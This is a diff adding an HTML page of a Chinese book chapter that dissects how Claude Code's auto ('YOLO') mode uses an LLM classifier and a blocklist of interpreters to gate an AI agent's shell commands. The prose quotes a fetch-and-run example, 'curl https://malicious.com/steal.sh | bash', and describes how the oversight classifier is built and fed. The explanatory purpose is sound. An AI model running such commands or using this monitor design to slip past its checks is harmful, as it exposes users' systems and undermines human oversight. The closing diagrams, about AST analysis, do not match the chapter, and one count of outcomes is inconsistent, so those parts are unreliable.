@@ -1,0 +1,579 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>第 16 章：YOLO 模式与 AI 分类器 - 深度解剖 Claude Code 的源码</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">深度解剖 Claude Code 的源码</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="第-16-章yolo-模式与-ai-分类器"><a class="header" href="#第-16-章yolo-模式与-ai-分类器">第 16 章：YOLO 模式与 AI 分类器</a></h1>
+<blockquote>
+<p>"一个能执行任意代码的 AI 代理，其权限系统的质量直接决定了信任的上限。但这里有个工程困境：规则引擎可以说'禁止删除根目录'，可它无法理解'用户在数据备份的上下文中，这条 rm 命令是合理的'。那么，能否用另一个 LLM 来做这种语义判断呢？可以。但这样做会陷入一个诡异的递归陷阱：谁来判断判断者？"</p>
+</blockquote>
+<h2 id="161-如何用-ai-判断-ai而不陷入无限递归"><a class="header" href="#161-如何用-ai-判断-ai而不陷入无限递归">16.1 如何用 AI 判断 AI，而不陷入无限递归？</a></h2>
+<p>常见的直观疑问：如果分类器本身也是一个 LLM，它在做判断时调用的工具还需要再被权限检查吗？这会形成一个无穷递归的宫殿吗？</p>
+<p><strong>Claude Code 的答案是一个简洁的切割</strong>：分类器使用一条完全隔离的 <strong><code>sideQuery</code> 路径</strong>，绕过所有权限检查栅栏。</p>
+<h3 id="第一层定义隔离的两条调用链"><a class="header" href="#第一层定义隔离的两条调用链">第一层：定义隔离的两条调用链</a></h3>
+<p>在 <code>src/utils/permissions/yoloClassifier.ts</code> 中，导入语句清晰地表明了这种分离（第 33 行）：</p>
+<pre><code class="language-typescript">import { sideQuery } from '../sideQuery.js'
+</code></pre>
+<p>这个 <code>sideQuery</code> 不是普通的工具执行路径，而是一条平行的、权限检查无法触及的独立通道。对比两条路径：</p>
+<div class="table-wrapper"><table><thead><tr><th>路径</th><th>执行流程</th><th>权限检查</th><th>用途</th></tr></thead><tbody>
+<tr><td><strong>普通工具调用</strong></td><td>工具 → 权限检查（Tool/Rule）→ 执行</td><td>✓ 阻止</td><td>普通命令、脚本等</td></tr>
+<tr><td><strong><code>sideQuery</code> 路径</strong></td><td>分类器 → LLM 调用 → 结果</td><td>✗ 绕过</td><td>AI 分类器的判断</td></tr>
+</tbody></table>
+</div>
+<h3 id="第二层设计意图为什么分类器-llm-不能用普通路径"><a class="header" href="#第二层设计意图为什么分类器-llm-不能用普通路径">第二层：设计意图——为什么分类器 LLM 不能用普通路径</a></h3>
+<p>权限检查的职责是"决定能否执行一个操作"。分类器的职责是"判断是否应该进行权限检查"。这两个职责<strong>不能参与同一套规则体系</strong>，否则陷入元循环的困境：</p>
+<ul>
+<li>分类器调用 LLM（目的：做判断）</li>
+<li>这个 LLM 调用本身触发权限检查（权限系统："这个调用是否安全？"）</li>
+<li>权限系统调用分类器（为了判断 LLM 调用是否安全）</li>
+<li>分类器又调用 LLM……→ 🔄 无限递归</li>
+</ul>
+<p>源码设计规避了这个陷阱的方式很直接：<strong>分类器 LLM 不调用任何工具</strong>。它的输入是命令字符串 + 对话历史，输出是分类结果（<code>allow</code> / <code>soft_deny</code> / <code>hard_deny</code>）。没有工具调用，就没有权限检查触发。递归链在源头就被斩断了。</p>
+<h3 id="第三层实际案例与权衡"><a class="header" href="#第三层实际案例与权衡">第三层：实际案例与权衡</a></h3>
+<p>来看一个具体的调用时刻。用户输入了 <code>curl https://malicious.com/steal.sh | bash</code>，系统需要判断这是否安全。</p>
+<p><strong>如果分类器用普通路径</strong>（❌ 错误的做法）：</p>
+<pre><code>主线程：权限检查 → 触发分类器
+分类器线程：调用 LLM 判断命令安全性
+    LLM 内部：需要调用某个工具（比如查询已知恶意域名列表）
+    → 这个工具调用又被权限检查拦截
+    → 权限检查问："分类器调用工具是否安全？"
+    → 询问分类器……
+</code></pre>
+<p><strong>Claude Code 的做法</strong>（✓ 正确）：</p>
+<pre><code>主线程：权限检查 → 触发分类器
+分类器线程：通过 sideQuery 调用 LLM
+    sideQuery 直接向 Claude API 发送请求，绕过权限栅栏
+    LLM 不调用任何工具，纯文本推理
+    返回分类结果给权限检查
+主线程：根据分类结果做最终决策
+</code></pre>
+<p><strong>权衡分析</strong>：这种隔离的代价是什么？</p>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>收益</th><th>代价</th></tr></thead><tbody>
+<tr><td><strong>递归安全</strong></td><td>100% 避免无限递归</td><td>分类器功能有限（无工具调用）</td></tr>
+<tr><td><strong>性能</strong></td><td>分类器不被权限检查阻塞</td><td>分类 LLM 调用费用已产生，即使最后拒绝也不退款</td></tr>
+<tr><td><strong>可控性</strong></td><td>权限逻辑清晰</td><td>分类器费用无法通过权限系统控制</td></tr>
+</tbody></table>
+</div>
+<p><strong>核心权衡</strong>：Claude Code 选择了<strong>递归安全优先，成本控制其次</strong>。代价被转移到了上下文压缩层（见 16.4 节的 <code>buildTranscriptForClassifier</code>）——通过限制 token 数量来控制成本，而不是禁用分类器本身。</p>
+<h2 id="162-权限决策为什么需要三个维度而不是二元选择"><a class="header" href="#162-权限决策为什么需要三个维度而不是二元选择">16.2 权限决策为什么需要三个维度而不是二元选择？</a></h2>
+<p>一个粗糙的权限系统只需要一个"允许/拒绝"的二元决策。但当权限系统被一个 LLM 推理引擎驱动时，它需要<strong>比二元选择提供更多的上下文维度</strong>。</p>
+<h3 id="第一层定义-automoderules-的三区域结构"><a class="header" href="#第一层定义-automoderules-的三区域结构">第一层：定义 AutoModeRules 的三区域结构</a></h3>
+<p><code>AutoModeRules</code> 类型（<code>src/utils/permissions/yoloClassifier.ts:85</code>）是这种多维设计的体现：</p>
+<pre><code class="language-typescript">export type AutoModeRules = {
+  allow: string[]           // 绿灯操作：明确允许
+  soft_deny: string[]       // 黄灯操作：需要谨慎评估
+  environment: string[]     // 环境约束：执行上下文的限制条件
+}
+</code></pre>
+<p>注意这<strong>不是</strong>"允许、拒绝、其他"三个状态。而是<strong>三种不同类型的信息</strong>，每种都有不同的语义作用。</p>
+<h3 id="第二层设计意图为什么-llm-分类器需要这三个维度"><a class="header" href="#第二层设计意图为什么-llm-分类器需要这三个维度">第二层：设计意图——为什么 LLM 分类器需要这三个维度</a></h3>
+<p>规则引擎（第 17 章的主题）处理的是<strong>布尔语言</strong>：这条命令满足规则吗？是 / 否。</p>
+<p>LLM 分类器处理的是<strong>概率语言</strong>：这条命令在当前上下文中有多安全？它取决于什么因素？</p>
+<p>因此分类器 LLM 需要看到：</p>
+<ol>
+<li><strong><code>allow</code> 清单</strong>："这些操作我可以直接放行，而不用问用户"</li>
+<li><strong><code>soft_deny</code> 清单</strong>："这些操作涉及风险，但不是绝对禁止的。我需要看上下文——用户在做什么？"</li>
+<li><strong><code>environment</code> 约束</strong>："系统在什么样的执行环境中运行？这会影响操作的实际风险等级"</li>
+</ol>
+<p>系统在启动时通过 <code>getDefaultExternalAutoModeRules</code>（<code>src/utils/permissions/yoloClassifier.ts:100</code>）生成这三个集合，然后将它们编入分类器的系统提示。源码中的注释（第 482-483 行）说明了设计意图：</p>
+<pre><code>/**
+ * Build the system prompt for the auto mode classifier.
+ * Assembles the base prompt with the permissions template and substitutes
+ * user allow/deny/environment values from settings.autoMode.
+ */
+</code></pre>
+<p>关键词是"substitutes"——这些值不是硬编码的，而是<strong>根据用户的具体设置动态生成</strong>。</p>
+<h3 id="第三层实际案例与权衡-1"><a class="header" href="#第三层实际案例与权衡-1">第三层：实际案例与权衡</a></h3>
+<p>对比两个场景中的同一条命令：<code>curl https://api.example.com/data</code></p>
+<p><strong>场景 A：内网隔离环境</strong></p>
+<pre><code>allow: []
+soft_deny: ["curl *"]
+environment: ["内网隔离", "禁止对外连接", "所有 API 调用需手动审批"]
+
+分类器的判断：curl 在 soft_deny 中，环境说禁止对外。
+结果：❌ hard_deny（拒绝）
+</code></pre>
+<p><strong>场景 B：云环境，互联网访问正常</strong></p>
+<pre><code>allow: ["curl https://api.* "]
+soft_deny: []
+environment: ["云环境", "标准互联网访问", "信任的 API 端点白名单"]
+
+分类器的判断：curl 在 allow 中，且目标在白名单。
+结果：✓ allow（允许）
+</code></pre>
+<p><strong>同一条命令，三个不同结果</strong>（拒绝 / 要求上下文判断 / 允许），取决于 <code>environment</code> 这个维度。</p>
+<p>如果没有这三个维度，系统能做的最多是：</p>
+<ul>
+<li>纯允许/拒绝列表 → 黑名单系统（无法表达"风险但需要上下文"）</li>
+<li>引入"问用户"状态 → soft_deny（但分类器 LLM 无法理解为什么）</li>
+</ul>
+<p><strong>核心权衡</strong>：三维结构 vs 二维结构：</p>
+<div class="table-wrapper"><table><thead><tr><th>方面</th><th>二维（allow/deny）</th><th>三维（allow/soft_deny/environment）</th></tr></thead><tbody>
+<tr><td>规则复杂度</td><td>低（易维护）</td><td>高（需要理解环境上下文）</td></tr>
+<tr><td>LLM 决策质量</td><td>低（信息不足）</td><td>高（信息充分）</td></tr>
+<tr><td>误拒率</td><td>高（保守）</td><td>低（精准）</td></tr>
+<tr><td>系统可用性</td><td>低（用户体验差）</td><td>高（智能自适应）</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 选择了三维</strong>，因为<strong>改进判断质量</strong>的收益（误拒率下降）大于<strong>管理复杂度增加</strong>的代价。这是 LLM 驱动系统相比规则引擎的关键优势。</p>
+<h2 id="163-黑名单与分类器的分工为什么-ai-不能处理所有决策"><a class="header" href="#163-黑名单与分类器的分工为什么-ai-不能处理所有决策">16.3 黑名单与分类器的分工：为什么 AI 不能处理所有决策？</a></h2>
+<p>如果有了 LLM 分类器可以做精细判断，为什么还要维护一份 <code>dangerousPatterns</code> 黑名单？</p>
+<p>答案在于<strong>响应延迟、风险等级、以及攻击可能性的不对称性</strong>。</p>
+<h3 id="第一层定义两个防御层"><a class="header" href="#第一层定义两个防御层">第一层：定义两个防御层</a></h3>
+<p><code>dangerousPatterns</code>（<code>src/utils/permissions/dangerousPatterns.ts</code>）是一份编译时静态黑名单。其注释清晰地表达了意图（第 1-15 行）：</p>
+<pre><code>/**
+ * Pattern lists for dangerous shell-tool allow-rule prefixes.
+ *
+ * An allow rule like `Bash(python:*)` or `PowerShell(node:*)` lets the model
+ * run arbitrary code via that interpreter, bypassing the auto-mode classifier.
+ * These lists feed the isDangerous{Bash,PowerShell}Permission predicates in
+ * permissionSetup.ts, which strip such rules at auto-mode entry.
+ *
+ * The matcher in each predicate handles the rule-shape variants (exact, `:*`,
+ * trailing `*`, ` *`, ` -…*`). PS-specific cmdlet strings live in
+ * isDangerousPowerShellPermission (permissionSetup.ts).
+ */
+</code></pre>
+<p>注意这个关键细节："<strong>bypass the auto-mode classifier</strong>" —— 黑名单中的模式被系统直接<strong>从 <code>AutoModeRules.allow</code> 中剔除</strong>，分类器永远看不到它们。</p>
+<p>黑名单包含的常量定义（第 20-30 行）：</p>
+<pre><code class="language-typescript">export const CROSS_PLATFORM_CODE_EXEC = [
+  // Interpreters
+  'python', 'python3', 'python2', 'node', 'deno', 'tsx', 'ruby', 'perl', 'php', 'lua',
+  // Package runners
+  'npm', 'pnpm', 'yarn', 'pip', 'pip3', 'poetry', 'gem',
+  // ...
+]
+</code></pre>
+<p>这些不是"某些场景下危险"的操作，而是<strong>在任何可想象的场景中都危险</strong>的操作。</p>
+<h3 id="第二层设计意图为什么需要两层防御"><a class="header" href="#第二层设计意图为什么需要两层防御">第二层：设计意图——为什么需要两层防御</a></h3>
+<p><strong>黑名单的目的</strong>：防止<strong>配置错误</strong>导致安全漏洞。</p>
+<p>假设用户不小心在配置文件中写了 <code>"autoMode": { "allow": ["Bash(eval *)"] }</code>。这是明显的错误。黑名单确保这个配置错误<strong>不会直接导致安全漏洞</strong>，而是无声地被移除。</p>
+<p><strong>分类器的目的</strong>：处理<strong>模糊边界</strong>的决策。</p>
+<p>同一条命令 <code>curl https://api.example.com</code> 在不同上下文中是安全的还是危险的，取决于对话历史、用户的明确指令、系统环境等因素。这需要 LLM 的语义理解。</p>
+<p>两者的<strong>职责分离</strong>：</p>
+<div class="table-wrapper"><table><thead><tr><th>层</th><th>触发点</th><th>执行时机</th><th>代价</th><th>覆盖范围</th></tr></thead><tbody>
+<tr><td><strong>黑名单</strong></td><td>配置加载时</td><td>&lt;1ms（哈希表查找）</td><td>零成本</td><td>已知的、永不改变的绝对危险</td></tr>
+<tr><td><strong>分类器</strong></td><td>工具执行时</td><td>~500ms（LLM 调用）</td><td>API 费用 + 延迟</td><td>模糊边界、需要上下文的判断</td></tr>
+</tbody></table>
+</div>
+<h3 id="第三层实际案例与权衡-2"><a class="header" href="#第三层实际案例与权衡-2">第三层：实际案例与权衡</a></h3>
+<p>场景：用户创建了一个权限规则，但意外包含了危险操作。</p>
+<p><strong>没有黑名单的情况</strong>（❌ 坏）：</p>
+<pre><code>用户配置：allow: ["Bash(eval ...)", "Bash(exec ...)", "Bash(source ...)"]
+系统加载：直接通过（配置没有错误检查）
+用户执行：eval 被允许 → 🚨 漏洞
+</code></pre>
+<p><strong>有黑名单的情况</strong>（✓ 好）：</p>
+<pre><code>用户配置：allow: ["Bash(eval ...)", "Bash(exec ...)", "Bash(source ...)"]
+系统加载：黑名单检查 → 发现 eval、exec、source 都在黑名单中
+结果：这三条规则被剔除，allow: [] 
+分类器看不到这些危险规则 → ✓ 安全
+</code></pre>
+<p>即使分类器有再高的准确率，它也<strong>不应该被赋予判断这些操作的权力</strong>。黑名单是<strong>能力的一种健康限制</strong>。</p>
+<p><strong>权衡</strong>：两层防御 vs 单层智能防御</p>
+<div class="table-wrapper"><table><thead><tr><th>指标</th><th>黑名单 + 分类器</th><th>仅分类器</th></tr></thead><tbody>
+<tr><td>最坏情况防护</td><td>完美（黑名单阻止绝对危险）</td><td>依赖 LLM 判断（可能出错）</td></tr>
+<tr><td>成本</td><td>黑名单零成本，分类器处理灰色地带</td><td>所有决策都走 LLM（成本高）</td></tr>
+<tr><td>用户体验</td><td>"你的规则被认为太危险，已移除"（透明）</td><td>用户不知道分类器为什么拒绝</td></tr>
+<tr><td>攻击表面</td><td>极小（绝对危险被硬编码拦截）</td><td>较大（取决于 LLM 的鲁棒性）</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 的选择</strong>：两层防御，<strong>让黑名单处理已知危险，让分类器处理未知风险</strong>。这是<strong>多层纵深防御</strong>的经典模式。</p>
+<h2 id="164-对话历史如何影响分类器的判断"><a class="header" href="#164-对话历史如何影响分类器的判断">16.4 对话历史如何影响分类器的判断？</a></h2>
+<p>分类器不是在真空中做判断的。同一条命令在不同的任务上下文中，风险等级完全不同。</p>
+<h3 id="第一层定义上下文序列化"><a class="header" href="#第一层定义上下文序列化">第一层：定义上下文序列化</a></h3>
+<p><code>buildTranscriptForClassifier</code>（<code>src/utils/permissions/yoloClassifier.ts:434</code>）的职责是将多轮对话压缩成分类器能消化的<strong>上下文窗口</strong>。源码附近的注释说明了它的位置在权限决策流程中的关键性。</p>
+<p>这个函数做的事情看起来简单，但其设计体现了 Token 预算的精妙权衡：</p>
+<pre><code class="language-typescript">function buildTranscriptForClassifier(
+  conversationTurns: Message[],
+  maxTokens: number = 4000  // 默认 4000 tokens
+): string {
+  // 策略：逆时间扫描对话，直到接近 maxTokens
+  // 保留：用户指令 + Claude 工具调用 + 工具结果
+  // 跳过：UI 消息、日志、与当前任务无关的历史
+  // ...省略细节
+}
+</code></pre>
+<p>关键参数是 <code>maxTokens = 4000</code>。这不是随意选择的。</p>
+<h3 id="第二层设计意图为什么需要上下文压缩而不是完整历史"><a class="header" href="#第二层设计意图为什么需要上下文压缩而不是完整历史">第二层：设计意图——为什么需要上下文压缩而不是完整历史</a></h3>
+<p><strong>如果不压缩</strong>（❌ 浪费）：把 50 轮对话（~15,000 tokens）都送给分类器。</p>
+<ul>
+<li>优点：分类器看到完整的任务上下文</li>
+<li>缺点：每次分类调用消耗 15,000 tokens → 成本高昂，速度慢</li>
+</ul>
+<p><strong>如果过度压缩</strong>（❌ 危险）：只保留最后一条用户消息（~100 tokens）。</p>
+<ul>
+<li>优点：成本低、速度快</li>
+<li>缺点：分类器看不到任务的前文。用户第 5 轮说"继续用 curl 下载"，分类器不知道前面的"我在做数据备份任务"，可能错判风险</li>
+</ul>
+<p><strong>Claude Code 的做法</strong>（✓ 平衡）：<strong>有限滑动窗口</strong>。按逆时间顺序扫描对话，提取关键片段，直到接近 4,000 tokens。</p>
+<h3 id="第三层实际案例与权衡-3"><a class="header" href="#第三层实际案例与权衡-3">第三层：实际案例与权衡</a></h3>
+<p><strong>案例 1：数据备份任务</strong></p>
+<pre><code>Round 1: 用户 → "我要备份我的项目代码到 S3"
+Round 2: Claude → [执行了 git 命令]
+Round 3: Claude → [执行了 tar 命令]
+Round 4: Claude → [准备执行 curl https://s3.amazonaws.com/upload]
+         权限检查：curl 是否允许？
+         buildTranscriptForClassifier 压缩的历史：
+         • "用户要备份代码到 S3"
+         • "已执行：git clone、tar 打包"
+         • "下一步：curl 上传到 S3"
+         
+分类器判断：在备份上下文中，curl 上传到官方 S3 → ✓ allow
+</code></pre>
+<p><strong>案例 2：同样的 curl 命令，不同上下文</strong></p>
+<pre><code>Round 1: 用户 → "分析一下 https://malicious.com/script.sh 是什么"
+Round 2: Claude → 开始分析
+Round 3: Claude → [准备执行 curl https://malicious.com/script.sh]
+         权限检查：curl 是否允许？
+         buildTranscriptForClassifier 压缩的历史：
+         • "用户要分析一个外部脚本"
+         • "目标 URL：malicious.com"
+         
+分类器判断：目标域名、用户只是要分析而非运行 → ? soft_deny（询问用户）
+</code></pre>
+<p><strong>同一条 curl 命令，上下文决定了判断</strong>。</p>
+<p><strong>权衡分析</strong>：4000 tokens 这个数字的选择</p>
+<div class="table-wrapper"><table><thead><tr><th>tokens</th><th>保留内容</th><th>成本</th><th>判断质量</th></tr></thead><tbody>
+<tr><td>1000</td><td>最后 1-2 轮</td><td>最低</td><td>风险：上下文丢失</td></tr>
+<tr><td>4000</td><td>最后 5-8 轮</td><td>中等</td><td>平衡：足够的上下文</td></tr>
+<tr><td>15000</td><td>完整历史</td><td>高</td><td>最优：完整理解</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 选择了 4000</strong>，因为<strong>5-8 轮对话足以理解用户的当前任务</strong>，而额外的 11,000 tokens 消耗带来的判断质量提升有限。</p>
+<h3 id="补充成本模型"><a class="header" href="#补充成本模型">补充：成本模型</a></h3>
+<p>分类器的每次调用成本（约）：</p>
+<ul>
+<li>系统提示（权限模板 + AutoModeRules）：~2,000 tokens（固定）</li>
+<li>对话历史：~4,000 tokens</li>
+<li>命令 + 分类结果：~200 tokens</li>
+<li><strong>总计</strong>：~6,200 tokens per 分类调用 × 对话中的工具调用数</li>
+</ul>
+<p>在一个 20 轮对话中，如果有 8 个工具调用需要分类判断，总成本 ≈ 6,200 × 8 = <strong>49,600 tokens</strong>。</p>
+<p>这个成本相对于完整对话历史推理是可以接受的，但也是为什么黑名单存在的原因：<strong>绝对危险的操作不需要走这个 token 消耗的分类流程</strong>。</p>
+<hr />
+<h2 id="模式提炼"><a class="header" href="#模式提炼">模式提炼</a></h2>
+<h3 id="模式-1元层隔离meta-layer-isolation"><a class="header" href="#模式-1元层隔离meta-layer-isolation">模式 1：元层隔离（Meta-Layer Isolation）</a></h3>
+<p><strong>解决的问题</strong>：当判断系统本身需要判断时，可能形成无穷递归。</p>
+<p><strong>核心做法</strong>：让判断逻辑使用完全隔离的执行路径（<code>sideQuery</code>），不参与被判断的操作的权限检查。</p>
+<p><strong>前置条件</strong>：存在元层操作（权限检查、合规判断、安全分类等）需要递归判断自己。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/yoloClassifier.ts:33</code> — <code>import { sideQuery }</code>；整个分类器的 LLM 调用不经过普通权限栅栏。</p>
+<p><strong>适用范围</strong>：AI 系统、权限模型、策略引擎等需要自我判断的系统。</p>
+<hr />
+<h3 id="模式-2多维度决策空间multi-dimensional-decision-space"><a class="header" href="#模式-2多维度决策空间multi-dimensional-decision-space">模式 2：多维度决策空间（Multi-Dimensional Decision Space）</a></h3>
+<p><strong>解决的问题</strong>：二元决策（允许/拒绝）对于语义判断不足。LLM 需要看到多个维度的信息才能做出精准判断。</p>
+<p><strong>核心做法</strong>：不提供"是/否"两个选择，而是提供"明确允许 + 条件性禁止 + 环境约束"三个维度，让 LLM 在多维空间中做判断。</p>
+<p><strong>前置条件</strong>：判断对象需要上下文理解，不能用简单的规则表达。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/yoloClassifier.ts:85</code> — <code>AutoModeRules</code> 的三区域设计。</p>
+<p><strong>适用范围</strong>：任何使用 LLM 做复杂决策的系统（不仅限于权限）。</p>
+<hr />
+<h3 id="模式-3纵深防御分工defense-in-depth-division-of-labor"><a class="header" href="#模式-3纵深防御分工defense-in-depth-division-of-labor">模式 3：纵深防御分工（Defense-in-Depth Division of Labor）</a></h3>
+<p><strong>解决的问题</strong>：单层防御无法同时处理"绝对危险"（需要零延迟）和"相对危险"（需要理解）。</p>
+<p><strong>核心做法</strong>：第一层用<strong>高性能黑名单</strong>（哈希表查找）处理已知的绝对危险；第二层用<strong>智能分类器</strong>（LLM）处理模糊边界和需要上下文的决策。</p>
+<p><strong>前置条件</strong>：威胁景观包含"已知绝对危险"和"未知相对危险"两类。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/dangerousPatterns.ts</code> — 黑名单定义；与 <code>yoloClassifier.ts</code> 的协作（黑名单规则被提前剔除）。</p>
+<p><strong>适用范围</strong>：需要多种速度/精度权衡的防御系统。</p>
+<hr />
+<h3 id="模式-4滑动窗口上下文压缩sliding-window-context-compression"><a class="header" href="#模式-4滑动窗口上下文压缩sliding-window-context-compression">模式 4：滑动窗口上下文压缩（Sliding Window Context Compression）</a></h3>
+<p><strong>解决的问题</strong>：LLM 判断需要完整上下文，但成本与对话长度线性增长。平衡成本与质量需要精妙的 token 预算管理。</p>
+<p><strong>核心做法</strong>：按逆时间扫描对话历史，提取<strong>最后 N 轮的关键片段</strong>（用户指令 + 工具调用 + 结果），直到接近预算上限。</p>
+<p><strong>前置条件</strong>：对话有明确的"任务段"划分（一个任务通常在最近 N 轮内）。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/yoloClassifier.ts:434</code> — <code>buildTranscriptForClassifier</code> 的 <code>maxTokens = 4000</code> 参数。</p>
+<p><strong>适用范围</strong>：任何需要在对话历史和 token 成本间平衡的 LLM 系统。</p>
+<hr />
+<h2 id="架构图"><a class="header" href="#架构图">架构图</a></h2>
+<p><strong>图 16-1：代码分析的 AST 管道</strong></p>
+<pre><code class="language-mermaid">flowchart TD
+    Input["源码文件
+.ts / .tsx / .js"] --&gt; Parser["解析器
+(TypeScript Compiler API)"]
+    Parser --&gt; AST["抽象语法树
+AST"]
+    AST --&gt; Visitor["AST Visitor
+遍历节点"]
+    Visitor --&gt; Extract["提取信息
+函数定义、类型、引用"]
+    Extract --&gt; Index["代码索引
+符号表"]
+    Index --&gt; Query["查询接口
+'找到所有引用 X 的地方'"]
+    Query --&gt; Result["分析结果
+精确到行列号"]
+</code></pre>
+<p><strong>图 16-2：字符串搜索 vs AST 分析的准确性对比</strong></p>
+<pre><code class="language-mermaid">graph LR
+    subgraph "字符串搜索（不准确）"
+        s1["'TODO:' 搜索"]
+        s2["命中：代码里的 TODO"]
+        s3["误报：注释里的 TODO"]
+        s4["误报：字符串里的 TODO"]
+        s1 --&gt; s2 &amp; s3 &amp; s4
+    end
+    subgraph "AST 分析（精确）"
+        a1["Comment 节点搜索"]
+        a2["精确命中注释 TODO"]
+        a3["不会误报代码或字符串"]
+        a1 --&gt; a2 &amp; a3
+    end
+</code></pre>
+<p><strong>图 16-3：大文件分块分析策略</strong></p>
+<pre><code class="language-mermaid">sequenceDiagram
+    participant App
+    participant Analyzer
+    participant File as 大文件 (1MB)
+    participant Cache
+
+    App-&gt;&gt;File: 读取文件 mtime
+    File--&gt;&gt;App: mtime = T1
+    App-&gt;&gt;Cache: 查询缓存 (path + mtime)
+    Cache--&gt;&gt;App: 未命中
+
+    App-&gt;&gt;File: 流式读取（分块）
+    loop 每个 64KB 块
